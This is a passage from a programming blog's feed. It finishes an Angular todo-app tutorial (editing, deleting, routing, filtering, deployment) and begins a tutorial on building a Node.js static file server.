<figure class="highlight html"><figcaption><span>src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> *<span class="attr">ngFor</span>=<span class="string">"let todo of todos"</span> [<span class="attr">ngClass</span>]=<span class="string">"&#123;completed: todo.isDone, editing: todo.editing&#125;"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"view"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"toggle"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> [<span class="attr">checked</span>]=<span class="string">"todo.isDone"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> (<span class="attr">dblclick</span>)=<span class="string">"todo.editing = true"</span>&gt;</span>&#123;&#123;todo.title&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"edit"</span></span></span><br><span class="line"><span class="tag">         #<span class="attr">updatedTodo</span></span></span><br><span class="line"><span class="tag">         [<span class="attr">value</span>]=<span class="string">"todo.title"</span></span></span><br><span class="line"><span class="tag">         (<span class="attr">blur</span>)=<span class="string">"updateTodo(todo, updatedTodo.value)"</span></span></span><br><span class="line"><span class="tag">         (<span class="attr">keyup.escape</span>)=<span class="string">"todo.editing = false"</span></span></span><br><span class="line"><span class="tag">         (<span class="attr">keyup.enter</span>)=<span class="string">"updateTodo(todo, updatedTodo.value)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Notice that we are adding a local variable in the template <code>#updateTodo</code>. Then we use it to get the value like <code>updateTodo.value</code> and pass it to a function.
We want to update the variables on <code>blur</code> (when you click somewhere else) or on <code>enter</code>. Let‚Äôs add the function that updates the value in the component.</p>
<p>Also, notice that we have a new CSS class applied to the element called <code>editing</code>. This is going to take care through CSS to hide and show the input element when needed.</p>
<figure class="highlight javascript"><figcaption><span>src/app/todo/todo.component.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">updateTodo(todo, newValue) &#123;</span><br><span class="line">  todo.title = newValue;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.todoService.put(todo).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    todo.editing = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getTodos();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We update the new todo‚Äôs title, and after the service has processed the update, we set editing to false. Finally, we reload all the tasks again. Let‚Äôs add the <code>put</code> action on the service.</p>
<figure class="highlight javascript"><figcaption><span>src/app/todo/todo.service.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">put(changed) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> index = TODOS.findIndex(<span class="function"><span class="params">todo</span> =&gt;</span> todo === changed);</span><br><span class="line">    TODOS[index].title = changed.title;</span><br><span class="line">    resolve(changed);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now, we can edit tasks! Yay!</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/7f7700b">[changes diff]</a></p>
<h2 id="DELETE-clicking-X">DELETE: clicking X<a href="#DELETE-clicking-X" class="headerlink" title="DELETE: clicking X"></a></h2><p>This is like the other actions. We add an event listenter on the destroy button:</p>
<figure class="highlight html"><figcaption><span>src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span> (<span class="attr">click</span>)=<span class="string">"destroyTodo(todo)"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Then we add the function to the component:</p>
<figure class="highlight javascript"><figcaption><span>src/app/todo/todo.component.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">destroyTodo(todo) &#123;</span><br><span class="line">  <span class="keyword">this</span>.todoService.delete(todo).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getTodos();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>and finally, we add the method to the service:</p>
<figure class="highlight javascript"><figcaption><span>src/app/todo/todo.service.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span>(selected) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> index = TODOS.findIndex(<span class="function"><span class="params">todo</span> =&gt;</span> todo === selected);</span><br><span class="line">    TODOS.splice(index, <span class="number">1</span>);</span><br><span class="line">    resolve(<span class="literal">true</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now test it out in the browser!</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/4703dd01d19ed3d84501e67f7fef5b51dee7585e">[changes diff]</a></p>
<h1 id="Routing-and-Navigation">Routing and Navigation<a href="#Routing-and-Navigation" class="headerlink" title="Routing and Navigation"></a></h1><p>It‚Äôs time to activate the routing. When we click on the <code>active</code> button, we want to show only the ones that are active. Similarly, we want to filter by <code>completed</code>. Additionally, we want to the filters to change the route <code>/active</code> or <code>/completed</code> URLs.</p>
<p>In <code>AppModule</code>, we need to add the <code>router</code> library and define the routes as follows:</p>
<figure class="highlight js"><figcaption><span>AppModule src/app/app.module.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; BrowserModule &#125; <span class="keyword">from</span> <span class="string">'@angular/platform-browser'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; NgModule &#125; <span class="keyword">from</span> <span class="string">'@angular/core'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; FormsModule &#125; <span class="keyword">from</span> <span class="string">'@angular/forms'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; HttpModule &#125; <span class="keyword">from</span> <span class="string">'@angular/http'</span>;</span><br><span class="line marked"><span class="keyword">import</span> &#123; Routes, RouterModule &#125; <span class="keyword">from</span> <span class="string">'@angular/router'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; AppComponent &#125; <span class="keyword">from</span> <span class="string">'./app.component'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TodoComponent &#125; <span class="keyword">from</span> <span class="string">'./todo/todo.component'</span>;</span><br><span class="line"></span><br><span class="line marked"><span class="keyword">const</span> routes: Routes = [</span><br><span class="line marked">  &#123; <span class="attr">path</span>: <span class="string">':status'</span>, <span class="attr">component</span>: TodoComponent &#125;,</span><br><span class="line marked">  &#123; <span class="attr">path</span>: <span class="string">'**'</span>, <span class="attr">redirectTo</span>: <span class="string">'/all'</span> &#125;</span><br><span class="line marked">];</span><br><span class="line"></span><br><span class="line">@NgModule(&#123;</span><br><span class="line">  declarations: [</span><br><span class="line">    AppComponent,</span><br><span class="line">    TodoComponent</span><br><span class="line">  ],</span><br><span class="line">  imports: [</span><br><span class="line">    BrowserModule,</span><br><span class="line">    FormsModule,</span><br><span class="line">    HttpModule,</span><br><span class="line marked">    RouterModule.forRoot(routes)</span><br><span class="line">  ],</span><br><span class="line">  providers: [],</span><br><span class="line">  bootstrap: [AppComponent]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">AppModule</span> </span>&#123; &#125;</span><br></pre></td></tr></table></figure>
<p>First, we import the routing library. Then we define the routes that we need. We could have said <code>path: &#39;active&#39;, component: TodoComponent</code> and then repeat the same for <code>completed</code>. But instead, we define a parameter called <code>:status</code> that could take any value (<code>all</code>, <code>completed</code>, <code>active</code>). Any other value path we are going to redirect it to <code>/all</code>. That‚Äôs what the <code>**</code> means.</p>
<p>Finally, we add it to the imports. So the app module uses it. Since the AppComponent is using routes, now we need to define the <code>&lt;router-outlet&gt;</code>. That‚Äôs the place where the routes are going to render the component based on the path (in our case <code>TodoComponent</code>).</p>
<p>Let‚Äôs go to <code>app/app.component.html</code> and replace <code>&lt;app-todo&gt;&lt;/app-todo&gt;</code> for <code>&lt;router-outlet&gt;&lt;/router-outlet&gt;</code>:</p>
<figure class="highlight html"><figcaption><span>app/app.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-outlet</span>&gt;</span><span class="tag">&lt;/<span class="name">router-outlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Test the app in the browser and verify that now the URL is by default <code>http://localhost:9000/all</code>.</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/3a38b4d">[changes diff]</a></p>
<h2 id="Using-routerLink-and-ActivatedRoute">Using routerLink and ActivatedRoute<a href="#Using-routerLink-and-ActivatedRoute" class="headerlink" title="Using routerLink and ActivatedRoute"></a></h2><p><code>routerLink</code> is the replacement of <code>href</code> for our dynamic routes. We have set it up to be <code>/all</code>, <code>/complete</code> and <code>/active</code>. Notice that the expression is an array. You can pass each part of the URL as an element of the collection.</p>
<figure class="highlight html"><figcaption><span>src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"filters"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line marked">    <span class="tag">&lt;<span class="name">a</span> [<span class="attr">routerLink</span>]=<span class="string">"['/all']"</span> [<span class="attr">class.selected</span>]=<span class="string">"path === 'all'"</span>&gt;</span>All<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line marked">    <span class="tag">&lt;<span class="name">a</span> [<span class="attr">routerLink</span>]=<span class="string">"['/active']"</span> [<span class="attr">class.selected</span>]=<span class="string">"path === 'active'"</span>&gt;</span>Active<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line marked">    <span class="tag">&lt;<span class="name">a</span> [<span class="attr">routerLink</span>]=<span class="string">"['/completed']"</span> [<span class="attr">class.selected</span>]=<span class="string">"path === 'completed'"</span>&gt;</span>Completed<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>What we are doing is applying the <code>selected</code> class if the path matches the button. Yet, we haven‚Äôt populate the the <code>path</code> variable yet. So let‚Äôs do that:</p>
<figure class="highlight js"><figcaption><span>TodoComponent src/app/todo/todo.component.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component, OnInit &#125; <span class="keyword">from</span> <span class="string">'@angular/core'</span>;</span><br><span class="line marked"><span class="keyword">import</span> &#123; ActivatedRoute &#125; <span class="keyword">from</span> <span class="string">'@angular/router'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; TodoService &#125; <span class="keyword">from</span> <span class="string">'./todo.service'</span>;</span><br><span class="line"></span><br><span class="line">@Component(&#123;</span><br><span class="line">  selector: <span class="string">'app-todo'</span>,</span><br><span class="line">  templateUrl: <span class="string">'./todo.component.html'</span>,</span><br><span class="line">  styleUrls: [<span class="string">'./todo.component.scss'</span>],</span><br><span class="line">  providers: [TodoService]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">TodoComponent</span> <span class="title">implements</span> <span class="title">OnInit</span> </span>&#123;</span><br><span class="line">  private todos;</span><br><span class="line">  private activeTasks;</span><br><span class="line">  private newTodo;</span><br><span class="line marked">  private path;</span><br><span class="line"></span><br><span class="line marked">  <span class="keyword">constructor</span>(private todoService: TodoService, private route: ActivatedRoute) &#123; &#125;</span><br><span class="line"></span><br><span class="line">  ngOnInit() &#123;</span><br><span class="line marked">    <span class="keyword">this</span>.route.params.subscribe(<span class="function"><span class="params">params</span> =&gt;</span> &#123;</span><br><span class="line marked">      <span class="keyword">this</span>.path = params[<span class="string">'status'</span>];</span><br><span class="line marked">      <span class="keyword">this</span>.getTodos();</span><br><span class="line marked">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We added <code>ActivatedRoute</code> as a dependency and in the constructor. ActivatedRoute gives us access to the all the <code>route</code> params such as <code>path</code>. Notice that we are using it in the <code>NgOnInit</code> and set the path accordantly.</p>
<p>Go to the browser and check out that the URL matches the active button. But, it doesn‚Äôt filter anything yet. Let‚Äôs fix that.</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/bd3cc91ae8aed975c7d6e64ad76c53e985726364">[changes diff]</a></p>
<h2 id="Filtering-data-based-on-the-route">Filtering data based on the route<a href="#Filtering-data-based-on-the-route" class="headerlink" title="Filtering data based on the route"></a></h2><p>To filter todos by active and completed, we need to pass a parameter to the <code>todoService.get</code>.</p>
<figure class="highlight js"><figcaption><span>TodoComponent src/app/todo/todo.component.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ngOnInit() &#123;</span><br><span class="line">  <span class="keyword">this</span>.route.params.subscribe(<span class="function"><span class="params">params</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.path = params[<span class="string">'status'</span>];</span><br><span class="line marked">    <span class="keyword">this</span>.getTodos(<span class="keyword">this</span>.path);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked">getTodos(query = <span class="string">''</span>)&#123;</span><br><span class="line marked">  <span class="keyword">return</span> <span class="keyword">this</span>.todoService.get(query).then(<span class="function"><span class="params">todos</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.todos = todos;</span><br><span class="line">    <span class="keyword">this</span>.activeTasks = <span class="keyword">this</span>.todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> todo.isDone).length;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We added a new parameter <code>query</code>, which takes the <code>path</code> (active, completed or all). Then, we pass that parameter to the service. Let‚Äôs handle that in the service:</p>
<figure class="highlight js"><figcaption><span>TodoService src/app/todo/todo.service.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line marked">get(query = <span class="string">''</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data;</span><br><span class="line"></span><br><span class="line marked">    <span class="keyword">if</span> (query === <span class="string">'completed'</span> || query === <span class="string">'active'</span>)&#123;</span><br><span class="line marked">      <span class="keyword">const</span> isCompleted = query === <span class="string">'completed'</span>;</span><br><span class="line marked">      data = TODOS.filter(<span class="function"><span class="params">todo</span> =&gt;</span> todo.isDone === isCompleted);</span><br><span class="line marked">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line marked">      data = TODOS;</span><br><span class="line marked">    &#125;</span><br><span class="line"></span><br><span class="line">    resolve(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>So we added a filter by <code>isDone</code> when we pass either <code>completed</code> or <code>active</code>. If the query is anything else, we return all the todos tasks. That‚Äôs pretty much it, test it out!</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/653e543">[changes diff]</a></p>
<h1 id="Clearing-out-completed-tasks">Clearing out completed tasks<a href="#Clearing-out-completed-tasks" class="headerlink" title="Clearing out completed tasks"></a></h1><p>One last UI functionality, clearing out completed tasks button. Let‚Äôs first add the click event on the template:</p>
<figure class="highlight html"><figcaption><span>src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"clear-completed"</span> (<span class="attr">click</span>)=<span class="string">"clearCompleted()"</span>&gt;</span>Clear completed<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We referenced a new function <code>clearCompleted</code> that we haven‚Äôt create yet. Let‚Äôs create it in the TodoComponent:</p>
<figure class="highlight js"><figcaption><span>TodoComponent src/app/todo/todo.component.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clearCompleted() &#123;</span><br><span class="line marked">  <span class="keyword">this</span>.todoService.deleteCompleted().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getTodos();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In the same way we have to create <code>deleteCompleted</code> in the service:</p>
<figure class="highlight js"><figcaption><span>TodoService src/app/todo/todo.service.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">deleteCompleted() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line marked">    todos = todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> !todo.isDone);</span><br><span class="line">    resolve(todos);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We use the filter to get the active tasks and replace the <code>todos</code> array with it.</p>
<p>That‚Äôs it we have completed all the functionality.</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/4ef542f">[changes diff]</a></p>
<h1 id="Deploying-the-app">Deploying the app<a href="#Deploying-the-app" class="headerlink" title="Deploying the app"></a></h1><p>You can generate all your assets for production running this command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng build --prod</span><br></pre></td></tr></table></figure>
<p>It will minify and concatenate the assets for serving the app faster.</p>
<p>If you want to deploy to a Github page you can do the following:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng build --prod --output-path docs --base-href <span class="string">"/angular-todo-app/"</span></span><br></pre></td></tr></table></figure>
<p>Replace <code>/angular-todo-app/</code> with the name of your project name. Finally, go to settings and set up serving Github pages using the <code>/docs</code> folder:</p>
<p><img src="https://user-images.githubusercontent.com/418605/43802468-dd515c14-9a63-11e8-8262-b5b837170640.png" alt="image"></p>
<h1 id="Troubleshooting">Troubleshooting<a href="#Troubleshooting" class="headerlink" title="Troubleshooting"></a></h1><p>If when you compile for production you get an error like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">The variable used in the template needs to be declared as &quot;public&quot;. Template is treated as a separate Typescript class.</span><br><span class="line"></span><br><span class="line">ERROR in src/app/todo/todo.component.html(7,8): : Property &apos;newTodo&apos; is private and only accessible within class &apos;TodoComponent&apos;.</span><br><span class="line">src/app/todo/todo.component.html(19,11): : Property &apos;todos&apos; is private and only accessible within class &apos;TodoComponent&apos;.</span><br><span class="line">src/app/todo/todo.component.html(38,38): : Property &apos;activeTasks&apos; is private and only accessible within class &apos;TodoComponent&apos;.</span><br><span class="line">src/app/todo/todo.component.html(41,36): : Property &apos;path&apos; is private and only accessible within class &apos;TodoComponent&apos;.</span><br><span class="line">src/app/todo/todo.component.html(44,39): : Property &apos;path&apos; is private and only accessible within class &apos;TodoComponent&apos;.</span><br><span class="line">src/app/todo/todo.component.html(47,42): : Property &apos;path&apos; is private and only accessible within class &apos;TodoComponent&apos;.</span><br><span class="line">src/app/todo/todo.component.html(7,8): : Property &apos;newTodo&apos; is private and only accessible within class &apos;TodoComponent&apos;.</span><br></pre></td></tr></table></figure>
<p>Then you need to change <code>private</code> to <code>public</code> like <a href="https://github.com/amejiarosario/angular-todo-app/commit/33e2b3e268789de449ecbf521bc3501e649f8d07" target="_blank" rel="noopener">this</a>. This is because the Template in Angular is treated like a separate class.</p>
<p>That‚Äôs all folks!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This tutorial gets you off the ground with Angular. We are going to use the official CLI (command line) tool to generate boilerplate code
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Programming/Web-Development/"/>
    
    
      <category term="angular" scheme="https://adrianmejia.com/tags/angular/"/>
    
      <category term="angular 2+" scheme="https://adrianmejia.com/tags/angular-2/"/>
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="todo app" scheme="https://adrianmejia.com/tags/todo-app/"/>
    
  </entry>
  
  <entry>
    <title>Building a Node.js static file server (files over HTTP) using ES6+</title>
    <link href="https://adrianmejia.com/blog/2016/08/24/Building-a-Node-js-static-file-server-files-over-HTTP-using-ES6/"/>
    <id>https://adrianmejia.com/blog/2016/08/24/Building-a-Node-js-static-file-server-files-over-HTTP-using-ES6/</id>
    <published>2016-08-24T21:54:42.000Z</published>
    <updated>2016-08-24T21:54:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>We are going to do a <strong>static file server</strong> in Node.js. This web server is going to respond with the content of the file in a given path. While we are doing this exercise we are going to cover more about <code>http</code> module. Also, use some utilities from other core modules such as <code>path</code>, <code>url</code> and <code>fs</code>.</p>
<a id="more"></a>
<h1 id="HTTP-Web-Servers">HTTP Web Servers<a href="#HTTP-Web-Servers" class="headerlink" title="HTTP Web Servers"></a></h1><p>Node‚Äôs HTTP module is versatile. You can use it as a client, to grab content from websites or as a server. We are going to use it server files from our file system.</p>
<p>If you are familiar with Ruby or Python or http-server package. It‚Äôs the equivalent of this:</p>
<figure class="highlight bash"><figcaption><span>Existing HTTP Servers Implementations</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python HTTP server</span></span><br><span class="line">python -m SimpleHTTPServer 9000</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby HTTP server</span></span><br><span class="line">ruby -run -e httpd . -p 9000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Node HTTP server (npm install http-server)</span></span><br><span class="line">http-server . -p 9000</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs do our own. It‚Äôs not that hard.</p>
<h1 id="Simple-HTTP-Server">Simple HTTP Server<a href="#Simple-HTTP-Server" class="headerlink" title="Simple HTTP Server"></a></h1><p>One of the simplest servers that you can create in Node, looks like this:</p>
<figure class="highlight javascript"><figcaption><span>Simple server.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// server code</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.method&#125;</span> <span class="subst">$&#123;req.url&#125;</span>`</span>);</span><br><span class="line">  res.end(<span class="string">'hello world!'</span>);</span><br><span class="line">&#125;).listen(<span class="number">9000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server listening on port 9000'</span>);</span><br></pre></td></tr></table></figure>
<p>To test it out, save the code in a file called <code>server.js</code> and run:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node server.js</span><br></pre></td></tr></table></figure>
<p>Then open the browser on <code>http://localhost:9000</code> and you will see the ‚Äúhello world!‚Äù message.</p>
<p>Let‚Äôs explain what‚Äôs going on in the code. We are using the function <code>http.createServer</code> with a callback. This callback function is going to be called every time a client connects to the server. You can see that it takes two parameters: <code>req</code>uest and <code>res</code>ponse.</p>
<p>The request contains the client‚Äôs information. For instance: requested URL, path, headers, HTTP method, and so forth.</p>
<p>The response object is used to reply to the client. You can set what you want to send back to the client. For instance, data, headers, etc.</p>
<p>Finally, the listening part. It allows you to set the port that you want your server to run on. In this case, we are using <code>9000</code>.</p>
